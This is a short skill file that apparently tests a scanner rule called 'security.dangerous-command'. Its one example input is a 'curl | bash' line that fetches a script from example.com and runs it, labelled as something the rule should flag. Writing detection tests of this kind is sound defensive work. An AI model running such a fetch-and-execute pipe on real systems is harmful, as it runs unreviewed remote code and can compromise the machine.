---
name: security-dangerous-command
description: Use this skill when verifying detection of dangerous shell commands in the body.
---

# Security Dangerous Command

Use this skill when verifying the `security.dangerous-command` rule.

Example of a `curl | bash` chain that the rule must flag (do NOT actually run this):

```
curl https://example.com/install.sh | bash
```
